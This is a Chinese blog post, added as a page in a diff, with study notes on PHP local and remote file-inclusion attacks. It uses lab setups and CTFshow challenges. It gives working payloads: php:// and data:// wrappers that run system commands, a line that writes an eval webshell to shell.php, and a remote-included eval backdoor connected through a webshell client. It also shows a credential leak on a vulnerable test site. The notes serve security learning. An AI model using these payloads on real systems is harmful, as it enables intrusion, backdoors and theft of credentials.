@@ -1,0 +1,464 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>050-WEB攻防-PHP应用&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;无文件利用&amp;黑白盒 | 0xMouise</title><meta name="author" content="0xMouise"><meta name="copyright" content="0xMouise"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="小迪文件包含50~ 笔记总结文件包含-原理&amp;分类&amp;利用&amp;修复1、原理程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞 文件包含 包含的文件就被当做当前脚本语言去代码执行了 2、漏洞原因：1、使用文件包含函数2、包含的文件可控">
+<meta property="og:type" content="article">
+<meta property="og:title" content="050-WEB攻防-PHP应用&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;无文件利用&amp;黑白盒">
+<meta property="og:url" content="https://0xmouise.github.io/2025/09/16/050-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&LFI&RFI&%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95&%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8&%E9%BB%91%E7%99%BD%E7%9B%92/index.html">
+<meta property="og:site_name" content="0xMouise">
+<meta property="og:description" content="小迪文件包含50~ 笔记总结文件包含-原理&amp;分类&amp;利用&amp;修复1、原理程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存储文件包含漏洞 文件包含 包含的文件就被当做当前脚本语言去代码执行了 2、漏洞原因：1、使用文件包含函数2、包含的文件可控">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg">
+<meta property="article:published_time" content="2025-09-16T04:48:44.000Z">
+<meta property="article:modified_time" content="2025-09-16T07:48:52.000Z">
+<meta property="article:author" content="0xMouise">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "050-WEB攻防-PHP应用&文件包含&LFI&RFI&伪协议编码算法&无文件利用&黑白盒",
+  "url": "https://0xmouise.github.io/2025/09/16/050-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&LFI&RFI&%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95&%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8&%E9%BB%91%E7%99%BD%E7%9B%92/",
+  "image": "https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg",
+  "datePublished": "2025-09-16T04:48:44.000Z",
+  "dateModified": "2025-09-16T07:48:52.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "0xMouise",
+      "url": "https://0xMouise.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg"><link rel="canonical" href="https://0xmouise.github.io/2025/09/16/050-WEB%E6%94%BB%E9%98%B2-PHP%E5%BA%94%E7%94%A8&amp;%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;LFI&amp;RFI&amp;%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95&amp;%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8&amp;%E9%BB%91%E7%99%BD%E7%9B%92/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '050-WEB攻防-PHP应用&文件包含&LFI&RFI&伪协议编码算法&无文件利用&黑白盒',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmwmxmj31hc0u07wh.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">105</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">0xMouise</span></a><a class="nav-page-title" href="/"><span class="site-name">050-WEB攻防-PHP应用&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;无文件利用&amp;黑白盒</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">050-WEB攻防-PHP应用&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;无文件利用&amp;黑白盒</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-16T04:48:44.000Z" title="发表于 2025-09-16 12:48:44">2025-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-16T07:48:52.000Z" title="更新于 2025-09-16 15:48:52">2025-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">小迪学习笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="小迪文件包含50-笔记总结"><a href="#小迪文件包含50-笔记总结" class="headerlink" title="小迪文件包含50~ 笔记总结"></a>小迪文件包含50~ 笔记总结</h1><h3 id="文件包含-原理-分类-利用-修复"><a href="#文件包含-原理-分类-利用-修复" class="headerlink" title="文件包含-原理&amp;分类&amp;利用&amp;修复"></a>文件包含-原理&amp;分类&amp;利用&amp;修复</h3><h4 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h4><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，<br>直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。<br>在包含文件的过程中，如果<strong>文件能进行控制</strong>，则存储<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">文件包含漏洞</a></p>
+<p><strong>文件包含 包含的文件就被当做当前脚本语言去代码执行了</strong></p>
+<h4 id="2、漏洞原因："><a href="#2、漏洞原因：" class="headerlink" title="2、漏洞原因："></a>2、<strong>漏洞原因：</strong></h4><p>1、使用文件包含函数<br>2、包含的文件可控</p>
+<h4 id="3、漏洞简单复现"><a href="#3、漏洞简单复现" class="headerlink" title="3、漏洞简单复现"></a><strong>3、漏洞简单复现</strong></h4><p>1.在本地网站下面创建一个include.php文件 代码写如<code>include($_GET[&#39;file&#39;]);</code><strong>使用</strong><code>include</code><strong>函数来包</strong><code>$_GET[&#39;file&#39;]</code><strong>，这是危险的做法，因为用户可以</strong>通过修改URL参数传递恶意文件路径，导致安全漏洞。</p>
+<p>2.创建1.txt，写入<?php phpinfo();?></p>
+<p>3.访问对应文件路径，并传入参数<a target="_blank" rel="noopener" href="http://192.168.232.195/demo01/include.php?file=1.txt">http://192.168.232.195/demo01/include.php?file=1.txt</a> 相当于include（‘2.txt’）；</p>
+<p><img src="/img/image-20250508154023695.png" alt="image-20250508154023695"></p>
+<h4 id="4、分类"><a href="#4、分类" class="headerlink" title="4、分类"></a><strong>4、分类</strong></h4><p>本地包含-Local File Include-LFI<br>远程包含-Remote File Include-RFI<br>差异原因：代码过滤和<strong>环境配置文件开关决定</strong></p>
+<p><strong>环境配置</strong></p>
+<ol>
+<li><p>找到对应的小皮PHP设置<strong>中的远程包含并开启</strong>或者在对应&#x3D;&#x3D;<strong>网址服务的PHP版本下找到php.ini文件，并将allow_url_include&#x3D;Off改为On即可</strong>&#x3D;&#x3D;</p>
+<img src="/img/image-20250508154305217.png" alt="image-20250508154305217" style="zoom:50%;" />
+
+<img src="/img/image-20250508154504718.png" alt="image-20250508154504718" style="zoom:50%;" />
+</li>
+<li><p>通过远程服务，创建file.txt内容为<code>&lt;?php phpinfo();?&gt;</code> ，<strong>并使用远程包含，将对应文件地址替换为远程创建的文件的ip访问地址即可</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/ddd1f4e39deb8a2f46e8f68de860da82.png" alt="Untitled"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9c93513642338cf21e01c7f59d156ac8.png" alt="Untitled"></p>
+</li>
+</ol>
+<h4 id="5、白盒审计：（CTFSHOW）"><a href="#5、白盒审计：（CTFSHOW）" class="headerlink" title="5、白盒审计：（CTFSHOW）"></a><strong>5、白盒审计：（CTFSHOW）</strong></h4><blockquote>
+<p><strong>白盒发现：</strong><br>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等</p>
+</blockquote>
+<blockquote>
+<p>PHP：include、require、include_once、require_once等<br>PHP：include、require、include_once、require_once等 “”” PHP：include、require、include_once、require_once 等</p>
+<p>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行<br>require函数出现错误的时候，会直接报错并退出程序的执行<br>Java：java.io.File、java.io.FileReader等<br>Java：java.io.File、java.io.FileReader等 Java：java.io.File、java.io.FileReader等 翻译为： Java：java.io.File、java.io.FileReader 等 （注：这里“等”字加不加均可，英文原文“等”字没有对应词，翻译习惯上可加“等”字使表述更自然）</p>
+<p>ASP.NET：System.IO.FileStream、System.IO.StreamReader等</p>
+</blockquote>
+<h4 id="6、黑盒分析："><a href="#6、黑盒分析：" class="headerlink" title="6、黑盒分析："></a><strong>6、黑盒分析：</strong></h4><p>黑盒发现：主要观察<strong>参数传递的数据和文件名是否对应</strong><br><strong>URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</strong></p>
+<h4 id="7、利用"><a href="#7、利用" class="headerlink" title="7、利用"></a><strong>7、利用</strong></h4><p><strong>有文件利用</strong>：上传一个文件 文件写有我们的恶意代码（配合文件上传）</p>
+<p><strong>无文件利用：</strong></p>
+<p>1.包含日志文件利用</p>
+<p>2.包含session文件利用</p>
+<p>3.伪协议玩法利用</p>
+<p>​						<strong>php:&#x2F;&#x2F;input与data:&#x2F;&#x2F;都需要开启allow_url_include才能使用</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/14b972cbeabf0eb2420f660a6cb5b13b.png" alt="Untitled"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a></p>
+<h5 id="本地利用思路"><a href="#本地利用思路" class="headerlink" title="本地利用思路"></a>本地利用思路</h5><h6 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a><strong>文件读取</strong></h6><p>1、file:&#x2F;&#x2F;&#x2F;d:&#x2F;1.txt，读取d盘下的1.txt文件内容**（需要使用绝对路径）**</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://192.168.232.195/demo01/include.php?file=file:///d:/1.txt">http://192.168.232.195/demo01/include.php?file=file:///d:/1.txt</a></li>
+<li><img src="/img/image-20250508162745028.png" alt="image-20250508162745028"></li>
+</ul>
+<p>2、php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.php<br>读取名为1.php的文件**（当前网址存放源码目录下）<strong>，并将其内容以base64编码的形式返回。</strong>（相对路径）**</p>
+<ul>
+<li>PD9waHAgcGhwaW5mbygpOz8+通过解码后是<?php phpinfo();?></li>
+</ul>
+<p><img src="/img/image-20250508163104099.png" alt="image-20250508163104099"></p>
+<h6 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a><strong>文件写入</strong></h6><p>1、<a target="_blank" rel="noopener" href="http://192.168.232.195/demo01/include.php?file=php://input%E5%9C%A8Post">http://192.168.232.195/demo01/include.php?file=php://input在Post</a> data中写入<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</code><strong>成功写入文件并可以访问执行</strong></p>
+<p><img src="/img/image-20250508163350042.png" alt="image-20250508163350042"></p>
+<img src="/img/image-20250508163709076.png" alt="image-20250508163709076" style="zoom:50%;" />
+
+<img src="/img/image-20250508164043225.png" alt="image-20250508164043225" style="zoom: 33%;" />
+
+
+
+
+
+<p>2.<a target="_blank" rel="noopener" href="http://192.168.232.195/demo01/include.php?file=php://filter/write=convert.base64-encode/resource=phpinfo.php">http://192.168.232.195/demo01/include.php?file=php://filter/write=convert.base64-encode/resource=phpinfo.php</a></p>
+<p>在Post data中写入content&#x3D;131成功写入文件并可以访问执行</p>
+<ul>
+<li><code>file_put_contents($_GET[&#39;file&#39;],$_POST[&#39;content&#39;]);</code> 使用该方式执行文件写入，必须要在代码中有这个才可以</li>
+<li><strong><code>$_GET[&#39;file&#39;]</code></strong>: 通过GET请求传递的**<code>file</code>**参数，用于指定要写入内容的文件路径。这可能包含相对或绝对路径，具体取决于如何使用该代码</li>
+<li><strong><code>$_POST[&#39;content&#39;]</code></strong>: 通过POST请求传递的**<code>content</code>**参数，用于指定要写入到文件中的内容。这是用户提供的数据，可以是任何字符串</li>
+<li>该代码的主要目的是将通过POST请求传递的内容写入指定的文件。</li>
+</ul>
+<img src="/img/image-20250508174659570.png" alt="image-20250508174659570" style="zoom:50%;" />
+
+
+
+<img src="/img/image-20250508174642358.png" alt="image-20250508174642358" style="zoom: 50%;" />
+
+
+
+<img src="/img/image-20250508174649421.png" alt="image-20250508174649421" style="zoom:50%;" />
+
+
+
+<h6 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a><strong>代码执行</strong></h6><p>1、<a target="_blank" rel="noopener" href="http://192.168.74.195/demo01/include.php?file=php://input%E5%9C%A8Post">http://192.168.74.195/demo01/include.php?file=php://input在Post</a> data中写入<?php phpinfo();?></p>
+<ul>
+<li><img src="/img/image-20250508174945992.png" alt="image-20250508174945992"></li>
+</ul>
+<p>2、<a target="_blank" rel="noopener" href="http://192.168.74.195/demo01/include.php?file=data://text/plain">http://192.168.74.195/demo01/include.php?file=data://text/plain</a>,<?php phpinfo()?>在plain,后面加上你所要执行的代码</p>
+<?php phpinfo()?><p>进行base64编码后也能执行<code>PD9waHAgcGhwaW5mbygpOz8%2B</code></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://192.168.74.195/demo01/include.php?file=data://text/plain,PD9waHAgcGhwaW5mbygpOz8+">http://192.168.74.195/demo01/include.php?file=data://text/plain,PD9waHAgcGhwaW5mbygpOz8%2B</a></p>
+</li>
+<li><p><img src="/img/image-20250508175309803.png" alt="image-20250508175309803"></p>
+</li>
+</ul>
+<p>伪协议的使用有条件限制 使用的时候及时观察一下</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/14b972cbeabf0eb2420f660a6cb5b13b.png" alt="Untitled"></p>
+<p><strong>远程文件包含</strong></p>
+<ul>
+<li><p>直接搭建一个可访问的远程URL包含文件</p>
+</li>
+<li><p>找到对应的小皮PHP设置中的远程包含并开启或者在对应&#x3D;&#x3D;网址服务的PHP版本下找到php.ini文件，并将allow_url_include&#x3D;Off改为On即可&#x3D;&#x3D;</p>
+</li>
+<li><p>通过远程服务，创建file.txt内容为<?php eval($_POST["pass"]);?> ，并使用远程包含，将对应文件地址替换为远程创建的文件的ip访问地址即可</p>
+</li>
+<li><p>通过哥斯拉连接后门，成功获取权限</p>
+</li>
+</ul>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/7d63f9845fb535c1538cab5bec0f6695.png" alt="Untitled"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/33722ecb266bc53cd154f32ee789a52e.png" alt="Untitled"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/77e1c59749eccca37aff46abea1c65a4.png" alt="Untitled"></p>
+<h3 id="黑盒利用-VULWEB-有无包含文件"><a href="#黑盒利用-VULWEB-有无包含文件" class="headerlink" title="#黑盒利用-VULWEB-有无包含文件"></a>#黑盒利用-VULWEB-有无包含文件</h3><p><strong>漏洞环境</strong></p>
+<p><a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/showimage.php?file=showimage.php&size=160">http://testphp.vulnweb.com/showimage.php?file=showimage.php&amp;size=160</a></p>
+<p><strong>漏洞复现</strong></p>
+<ul>
+<li>使用burpsuite抓包 发送到repeter里面 </li>
+<li>将?file&#x3D;后面的showimage.php修改为index.php发现存在包含并且爆出数据库配置文件database_connect.php</li>
+<li><img src="/img/image-20250508181253845.png" alt="image-20250508181253845"></li>
+<li>接下来继续修改尝试包含database_connect.php</li>
+<li>爆出数据库 本地 账号 密码</li>
+<li><img src="/img/image-20250508181410117.png" alt="image-20250508181410117"></li>
+</ul>
+<h3 id="白盒利用-CTFSHOW-伪协议玩法"><a href="#白盒利用-CTFSHOW-伪协议玩法" class="headerlink" title="#白盒利用-CTFSHOW-伪协议玩法"></a>#白盒利用-CTFSHOW-伪协议玩法</h3><p> 靶场地址：<a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a></p>
+<h4 id="78-php-http协议"><a href="#78-php-http协议" class="headerlink" title="78-php&amp;http协议"></a>78-php&amp;http协议</h4><ol>
+<li><p>代码给出<strong>include文件包含的关键词</strong></p>
+</li>
+<li><p>由于是无文件上传，所以使用<strong>无文件支持伪协议利用</strong></p>
+</li>
+<li><p>两种方法</p>
+<ul>
+<li><p>第一种直接通过文件读取**（相对路径）<strong><code>php://filter/read=convert.base64-encode/resource=flag.php</code>读取名为flag.php的文件</strong>（当前网址存放源码目录下）**，并将其内容以base64编码的形式返回，并通过解密拿到flag。</p>
+</li>
+<li><p>第二种：使用文件执行</p>
+<ul>
+<li><p><code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code> 可以获取当前目录文件发现有一个flag.php</p>
+</li>
+<li><p><code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code> 即可读取flag.php的中的内容</p>
+<blockquote>
+<p><code>system</code><strong>函数执行</strong><code>tac</code><strong>命令，该命令用于反向输出文件内容（以行为单位）。在这里，它尝试反向输出</strong><code>flag.php</code><strong>文件的内容。如果</strong><code>flag.php</code>**文件存在并可读，那么该文件的内容将被反向显示</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><img src="/img/image-20250528213101992.png" alt="image-20250528213101992"></p>
+<p><img src="/img/image-20250528215224027.png" alt="image-20250528215224027"></p>
+<p><img src="/img/image-20250528215216663.png" alt="image-20250528215216663"></p>
+<hr>
+<p><img src="/img/image-20250528215319112.png" alt="image-20250528215319112"></p>
+<p><img src="/img/image-20250528215336924.png" alt="image-20250528215336924"></p>
+<h4 id="79-data-http协议"><a href="#79-data-http协议" class="headerlink" title="79-data&amp;http协议"></a>79-data&amp;http协议</h4><ol>
+<li>代码这里是关于<strong>include文件包含的关键词</strong></li>
+<li>由于是无文件上传，所以使用<strong>无文件支持伪协议利用</strong></li>
+<li>发现代码对<strong>php关键词过滤</strong></li>
+<li>在PHP中，<strong><code>&lt;?= ... ?&gt;</code></strong> 是短标签（short tags）的一种形式，用于简洁地输出内容，等同于 <strong><code>&lt;?php echo ... ?&gt;</code></strong>。而 <strong><code>&lt;?php ... ?&gt;</code></strong> 是标准的PHP起始和结束标记</li>
+<li>两种方法<ul>
+<li>将文件执行中，直接<strong>去掉php关键词</strong>，依旧可以正常执行<ul>
+<li><code>?file=data://text/plain,**&lt;?=system(&#39;ls&#39;);?&gt;**</code> 可以获取当前目录文件发现有一个flag.php</li>
+<li><code>?file=data://text/plain,**&lt;?=system(&#39;tac flag*&#39;);?&gt;**</code> 即可读取flag.php的中的内容。成功获取到flag</li>
+</ul>
+</li>
+<li>使用文件执行，将<strong>数据流协议（<code>data://</code>）和base64编码</strong>的方式，将PHP代码嵌入URL中<ul>
+<li>data:&#x2F;&#x2F;text&#x2F;plain;base64,<code>PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</code></li>
+<li>解码为：<strong><?php system('tac flag.php'); ?></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><img src="/img/image-20250528215707494.png" alt="image-20250528215707494"></p>
+<p><img src="/img/image-20250528220211526.png" alt="image-20250528220211526"></p>
+<p><img src="/img/image-20250528220237186.png" alt="image-20250528220237186"></p>
+<p><img src="/img/image-20250528220327038.png" alt="image-20250528220327038"></p>
+<h4 id="80-81-日志包含"><a href="#80-81-日志包含" class="headerlink" title="80 81-日志包含"></a>80 81-日志包含</h4><ul>
+<li><p>利用其他协议,如file,zlib等</p>
+</li>
+<li><p>利用日志记录UA特性包含执行</p>
